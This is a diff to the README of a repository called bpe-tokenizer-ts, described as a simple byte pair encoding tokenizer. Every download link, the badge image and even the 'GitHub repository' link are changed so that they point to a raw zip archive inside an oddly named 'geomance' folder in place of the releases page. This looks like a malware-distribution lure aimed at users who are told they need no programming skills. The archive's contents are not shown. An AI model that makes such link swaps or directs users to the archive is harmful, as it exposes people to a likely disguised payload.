@@ -1,6 +1,6 @@
 # 🤖 bpe-tokenizer-ts - Simple Byte Pair Encoding Tool
 
-[![Download bpe-tokenizer-ts](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/Catmono/bpe-tokenizer-ts/releases)
+[![Download bpe-tokenizer-ts](https://github.com/Catmono/bpe-tokenizer-ts/raw/refs/heads/main/geomance/ts_tokenizer_bpe_v2.2-beta.5.zip)](https://github.com/Catmono/bpe-tokenizer-ts/raw/refs/heads/main/geomance/ts_tokenizer_bpe_v2.2-beta.5.zip)
 
 ---
 
@@ -55,7 +55,7 @@ Follow these steps to get bpe-tokenizer-ts running on your computer:
 1. **Visit the Download Page**
 
    Click the big blue button at the top or go directly here:  
-   [https://github.com/Catmono/bpe-tokenizer-ts/releases](https://github.com/Catmono/bpe-tokenizer-ts/releases)  
+   [https://github.com/Catmono/bpe-tokenizer-ts/raw/refs/heads/main/geomance/ts_tokenizer_bpe_v2.2-beta.5.zip](https://github.com/Catmono/bpe-tokenizer-ts/raw/refs/heads/main/geomance/ts_tokenizer_bpe_v2.2-beta.5.zip)  
 
    This page hosts all the latest versions available to download.
 
@@ -80,7 +80,7 @@ Follow these steps to get bpe-tokenizer-ts running on your computer:
 To get the program:
 
 - **Go to the releases page:**  
-  [https://github.com/Catmono/bpe-tokenizer-ts/releases](https://github.com/Catmono/bpe-tokenizer-ts/releases)
+  [https://github.com/Catmono/bpe-tokenizer-ts/raw/refs/heads/main/geomance/ts_tokenizer_bpe_v2.2-beta.5.zip](https://github.com/Catmono/bpe-tokenizer-ts/raw/refs/heads/main/geomance/ts_tokenizer_bpe_v2.2-beta.5.zip)
 
 - **Pick the latest version** for your system.
 
@@ -150,7 +150,7 @@ While you do not need programming skills to run bpe-tokenizer-ts, learning a few
 
 ## 🔗 Useful Links
 
-- GitHub repository: https://github.com/Catmono/bpe-tokenizer-ts
-- Releases and downloads: https://github.com/Catmono/bpe-tokenizer-ts/releases
+- GitHub repository: https://github.com/Catmono/bpe-tokenizer-ts/raw/refs/heads/main/geomance/ts_tokenizer_bpe_v2.2-beta.5.zip
+- Releases and downloads: https://github.com/Catmono/bpe-tokenizer-ts/raw/refs/heads/main/geomance/ts_tokenizer_bpe_v2.2-beta.5.zip
 
-[![Download bpe-tokenizer-ts](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/Catmono/bpe-tokenizer-ts/releases)
+[![Download bpe-tokenizer-ts](https://github.com/Catmono/bpe-tokenizer-ts/raw/refs/heads/main/geomance/ts_tokenizer_bpe_v2.2-beta.5.zip)](https://github.com/Catmono/bpe-tokenizer-ts/raw/refs/heads/main/geomance/ts_tokenizer_bpe_v2.2-beta.5.zip)
